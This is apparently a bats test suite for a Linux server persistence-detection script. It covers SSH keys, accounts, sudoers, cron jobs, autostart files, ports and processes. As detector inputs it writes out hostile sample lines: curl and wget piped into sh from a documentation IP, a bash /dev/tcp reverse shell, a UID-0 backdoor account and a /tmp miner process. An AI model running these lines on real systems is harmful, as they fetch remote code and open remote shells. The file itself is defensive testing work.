#!/usr/bin/env bats
# persist_suspicious: cron lines and autostart scripts

load helper

setup() { load_script; }

@test "download-and-run and reverse shells are suspicious" {
  run persist_suspicious '*/5 * * * * root curl -fsSL http://192.0.2.1/x | sh'
  [ "$status" -eq 0 ]
  run persist_suspicious 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'
  [ "$status" -eq 0 ]
  run persist_suspicious "python3 -c 'import socket,os'"
  [ "$status" -eq 0 ]
}

@test "ordinary maintenance lines are not" {
  run persist_suspicious '0 3 * * * root /usr/bin/fail2ban-client set sshd unbanip 192.0.2.1 >/dev/null 2>&1'
  [ "$status" -eq 1 ]
  run persist_suspicious '*/5 * * * * www php -c /etc/php.ini /var/www/cron.php >/dev/null 2>&1'
  [ "$status" -eq 1 ]
  run persist_suspicious '15 2 * * * root sqlite3 /var/lib/fail2ban/fail2ban.sqlite3 vacuum'
  [ "$status" -eq 1 ]
}

@test "passwords in matched lines are masked" {
  run persist_suspicious '0 1 * * * root wget -qO- https://user:secret@192.0.2.1/x.sh | bash'
  [ "$status" -eq 0 ]
  [[ $output != *secret* ]]
}

# --- check_persistence with stubbed sources: first run = baseline, second run = changes

# sources of one run, written to files the stubs read
psetup() {
  P="$BATS_TEST_TMPDIR/p"; mkdir -p "$P"
  : >"$P/keys"; : >"$P/access"; : >"$P/cron"; : >"$P/procs"; : >"$P/addrs"
  printf 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n' >"$P/ss"
  echo 5 >"$P/nprocs"
  persist_keys()   { cat "$P/keys"; }
  persist_access() { cat "$P/access"; }
  persist_cron()   { cat "$P/cron"; }
  persist_procs()  { cat "$P/nprocs" >"$TMPD/procs_readable"; cat "$P/procs"; }
  persist_addrs()  { cat "$P/addrs"; }
  ss() { cat "$P/ss"; }
  ip() { :; }
  getent() {
    case "$1 $2" in
      "passwd root") echo "root:x:0:0:root:/root:/bin/bash" ;;
      "passwd 33")   echo "www-data:x:33:33::/var/www:/usr/sbin/nologin" ;;
      *) return 2 ;;
    esac
  }
  PERSISTENCE_IGNORE=""
}
key()    { printf '%s\t%s\t%s\n' "$@" >>"$P/keys"; }
acc()    { printf '%s\t%s\t%s\n' "$@" >>"$P/access"; }
cronl()  { printf 'line\t%s\t%s\n' "$1" "$2" >>"$P/cron"; }
cronf()  { printf 'file\t%s\t%s\n' "$1" "$2" >>"$P/cron"; }
listen() { printf 'LISTEN 0 4096 %s 0.0.0.0:* users:(("%s",pid=1,fd=3))\n' "$1" "$2" >>"$P/ss"; }
addr()   { printf '%s\t%s\n' "$1" "$2" >>"$P/addrs"; }
newrun() { : >"$BODY"; : >"$DALERTS"; ALERTS=(); }

# the server of the first run
base() {
  key root "ED25519 SHA256:aaaa" "admin@laptop"
  key root "RSA SHA256:bbbb" "old-key"
  acc account root "uid 0, shell /bin/bash"
  acc account christian "uid 1000, shell /bin/bash"
  acc "sudoers file" /etc/sudoers "checksum 0123456789ab"
  cronl "crontab of root" "0 3 * * * /usr/local/sbin/backup.sh"
  cronl "/etc/cron.d/psa" "*/5 * * * * root /opt/psa/admin/sbin/backup"
  listen 0.0.0.0:22 sshd; listen 0.0.0.0:443 nginx; listen 127.0.0.1:3306 mariadbd
  addr 203.0.113.10 ens6
}

@test "persistence, first run: everything stored as baseline, no alert" {
  psetup; base
  check_persistence
  run report
  [[ $output == *"SSH keys (authorized_keys): 2 key(s) of 1 account(s) – first run, stored as baseline"* ]]
  [[ $output == *"Accounts with a login shell: 2 | sudo group members: 0 | sudoers files: 1 – first run, stored as baseline"* ]]
  [[ $output == *"Cron jobs: 2 entr(y/ies) | autostart files"*": 0 – first run, stored as baseline"* ]]
  [[ $output == *"Processes: 5 checked, 0 suspicious"* ]]
  [[ $output == *"Listening TCP ports (not loopback): 22 sshd, 443 nginx – first run, stored as baseline"* ]]
  [[ $output != *3306* ]]
  [[ $output == *"IP addresses (global): 203.0.113.10 (ens6) – first run, stored as baseline"* ]]
  [ -z "$(alerts | grep .)" ]
  [ -f "$STATE_DIR/baseline/keys" ] && [ -f "$STATE_DIR/baseline/ports" ]
}

@test "persistence, second run: new key, account, sudo, cron, port and address raise alerts" {
  psetup; base
  check_persistence; newrun
  # the changes
  sed -i '/old-key/d' "$P/keys"
  key root "ED25519 SHA256:cccc" "unknown@vps"
  acc account backdoor "uid 0, shell /bin/bash"
  acc "sudo group" christian "member of sudo"
  cronl "crontab of root" "0 4 * * * /usr/local/sbin/report.sh"
  cronl "crontab of web1" "*/10 * * * * php /var/www/vhosts/a.example/cron.php"
  listen 0.0.0.0:4444 nc
  sed -i '/:443 /d' "$P/ss"
  addr 2001:db8::10 ens6
  addr 10.0.0.5 ens7
  check_persistence
  run report
  [[ $output == *"  + SSH key for root: ED25519 SHA256:cccc (unknown@vps)"* ]]
  [[ $output == *"  - SSH key removed for root: RSA SHA256:bbbb (old-key)"* ]]
  [[ $output == *"  ! account backdoor has UID 0 – full root rights under another name"* ]]
  [[ $output == *"  + christian is now member of sudo (sudo rights)"* ]]
  [[ $output == *"  + cron (crontab of web1): */10 * * * * php"* ]]
  [[ $output == *"  + listening port 4444 (nc)"* ]]
  [[ $output == *"  - listening port 443 (nginx) closed"* ]]
  [[ $output == *"  + address 10.0.0.5 on ens7 (private network)"* ]]
  run alerts
  [[ $output == *"Access: new SSH key for root: ED25519 SHA256:cccc (unknown@vps) – added by you?"* ]]
  [[ $output == *"Access: account backdoor has UID 0 (root rights under another name) – check it"* ]]
  [[ $output == *"Access: new account with a login shell: backdoor (uid 0, shell /bin/bash) – done by you?"* ]]
  [[ $output == *"Access: christian is now member of sudo (sudo rights) – done by you?"* ]]
  [[ $output == *"Cron: new entry in crontab of root: 0 4 * * * /usr/local/sbin/report.sh – added by you or a package update?"* ]]
  [[ $output != *"crontab of web1"* ]]                       # a customer's cron job: listed, no alert
  [[ $output == *"Ports: new listening TCP port 4444 (nc) – started by you?"* ]]
  [[ $output == *"Network: new public address 2001:db8::10 on ens6"* ]]
  [[ $output != *"10.0.0.5"* ]]
}

@test "persistence: a changed key comment is no alert, a changed sudoers file is" {
  psetup; base
  check_persistence; newrun
  sed -i 's/admin@laptop/admin@new-laptop/; s/checksum 0123456789ab/checksum ffffffffffff/' "$P/keys" "$P/access"
  check_persistence
  run report
  [[ $output == *"  ~ SSH key for root: ED25519 SHA256:aaaa – comment changed: admin@laptop → admin@new-laptop"* ]]
  [[ $output == *"  ~ sudoers file /etc/sudoers: checksum 0123456789ab → checksum ffffffffffff"* ]]
  run alerts
  [[ $output != *"SSH key"* ]]
  [[ $output == *"Access: sudoers file /etc/sudoers changed: checksum ffffffffffff – changed by you?"* ]]
}

@test "persistence: suspicious cron line and autostart script alert even in the first run" {
  psetup; base
  printf '#!/bin/sh\ncurl -fsSL http://192.0.2.1/x | sh\n' >"$P/evil.sh"
  cronl "/etc/cron.d/sys" "*/5 * * * * root wget -qO- http://192.0.2.1/m | bash"
  cronf "$P/evil.sh" "abcdef012345"
  check_persistence
  run alerts
  [[ $output == *"Cron: entry with suspicious content in /etc/cron.d/sys: */5 * * * * root wget -qO- http://192.0.2.1/m | bash – check it"* ]]
  [[ $output == *"Cron: autostart file $P/evil.sh contains suspicious commands: curl -fsSL http://192.0.2.1/x | sh – check it"* ]]
}

@test "persistence: new and changed autostart files (second run)" {
  psetup; base
  printf '#!/bin/sh\n/usr/bin/apt-get -qq update\n' >"$P/a.sh"; printf '#!/bin/sh\nlogrotate /etc/logrotate.conf\n' >"$P/b.sh"
  cronf "$P/a.sh" "111111111111"
  check_persistence; newrun
  sed -i 's/111111111111/222222222222/' "$P/cron"
  cronf "$P/b.sh" "333333333333"
  check_persistence
  run report
  [[ $output == *"  ~ autostart file changed: $P/a.sh"* ]]
  [[ $output == *"  + new autostart file: $P/b.sh"* ]]
  run alerts
  [[ $output == *"Cron: new autostart file $P/b.sh – added by you or a package update?"* ]]
  [[ $output != *"a.sh"* ]]
}

@test "persistence: suspicious processes; a program replaced by an update is not" {
  psetup; base
  touch "$P/updated-binary"
  printf '%s\t%s\t%s\t%s\n' 4711 33 "runs from /tmp" /tmp/.x/kdevtmpfsi \
                            4712 0 DELETED "$P/updated-binary (deleted)" \
                            4713 0 DELETED "/usr/sbin/gone (deleted)" >"$P/procs"
  check_persistence
  run report
  [[ $output == *"  ! process 4711 of www-data runs from /tmp: /tmp/.x/kdevtmpfsi"* ]]
  [[ $output == *"  ! process 4713 of uid 0 program deleted after start: /usr/sbin/gone (deleted)"* ]]
  [[ $output != *4712* ]]
  [[ $output == *"Processes: 5 checked, 2 suspicious"* ]]
  run alerts
  [[ $output == *"Process: PID 4711 of www-data runs from /tmp: /tmp/.x/kdevtmpfsi – crypto miner or backdoor? Check it"* ]]
}

@test "persistence: PERSISTENCE_IGNORE leaves a known finding out" {
  psetup; base
  printf '%s\t%s\t%s\t%s\n' 4711 33 "runs from /tmp" /tmp/known-tool >"$P/procs"
  PERSISTENCE_IGNORE='/tmp/known-tool'
  check_persistence
  run report
  [[ $output == *"Processes: 5 checked, 0 suspicious"* ]]
  [ -z "$(alerts | grep .)" ]
}

@test "persistence: no account database, no process paths, no ss – said so, nothing compared" {
  psetup; base
  getent() { return 2; }
  echo 0 >"$P/nprocs"
  : >"$P/ss"
  check_persistence
  run report
  [[ $output == *"SSH keys and accounts: not checked (getent passwd root gives no answer)"* ]]
  [[ $output == *"Processes: program paths not readable"* ]]
  [[ $output == *"Listening ports: could not be read (ss gave no answer)"* ]]
  [ ! -f "$STATE_DIR/baseline/keys" ]
}

@test "persistence with --only: nothing stored, the next normal run makes the baseline" {
  psetup; base
  ONLY_MODE=1
  check_persistence
  run report
  [[ $output == *"– no baseline yet (stored by the next normal run; --only stores nothing)"* ]]
  [ ! -f "$STATE_DIR/baseline/keys" ]
}

@test "persist_procs: program in /tmp, in a web folder, deleted" {
  local f="$BATS_TEST_TMPDIR/exe"
  printf '%s\t%s\t%s\n' /proc/999901 33 /tmp/.x/miner /proc/999902 33 /var/www/vhosts/a.example/httpdocs/x \
                         /proc/999903 0 "/usr/bin/old (deleted)" /proc/999904 0 /usr/bin/bash >"$f"
  run persist_procs "$f"
  [[ $output == *$'999901\t33\truns from /tmp\t/tmp/.x/miner'* ]]
  [[ $output == *$'999902\t33\truns from a web folder\t'* ]]
  [[ $output == *$'999903\t0\tDELETED\t/usr/bin/old (deleted)'* ]]
  [[ $output != *999904* ]]
  [ "$(cat "$TMPD/procs_readable")" -eq 4 ]
}

@test "persistence: the Plesk installer on 8447 is listed without alert, another program on 8447 is not" {
  psetup; base
  check_persistence; newrun
  listen 0.0.0.0:8447 autoinstaller
  check_persistence
  run report
  [[ $output == *"  + listening port 8447 (autoinstaller) – the Plesk installer, runs while it is used (no alert)"* ]]
  run alerts
  [[ $output != *"8447"* ]]
  psetup; base
  check_persistence; newrun
  listen 0.0.0.0:8447 nc
  check_persistence
  run alerts
  [[ $output == *"Ports: new listening TCP port 8447 (nc) – started by you?"* ]]
}

@test "persistence: many accounts getting the same shell in one run – one alert, each account listed" {
  psetup; base
  check_persistence; newrun
  for i in 1 2 3 4 5 6 7; do acc account "web$i" "uid 1000$i, shell /opt/psa/bin/chrootsh"; done
  sed -i 's|^account\tchristian\tuid 1000, shell /bin/bash|account\tchristian\tuid 1000, shell /opt/psa/bin/chrootsh|' "$P/access"
  check_persistence
  run report
  [[ $output == *"  + new account with a login shell: web1 (uid 10001, shell /opt/psa/bin/chrootsh)"* ]]
  [[ $output == *"  ~ account christian: uid 1000, shell /bin/bash → uid 1000, shell /opt/psa/bin/chrootsh"* ]]
  run alerts
  [[ $output == *"Access: 8 accounts got the login shell /opt/psa/bin/chrootsh in one run"* ]]
  [ "$(grep -c 'Access:' <<<"$output")" -eq 1 ]
}

@test "persistence: a few accounts with a new shell – one alert each, as before" {
  psetup; base
  check_persistence; newrun
  acc account web1 "uid 10001, shell /opt/psa/bin/chrootsh"
  acc account web2 "uid 10002, shell /opt/psa/bin/chrootsh"
  check_persistence
  run alerts
  [ "$(grep -c 'Access: new account with a login shell' <<<"$output")" -eq 2 ]
}
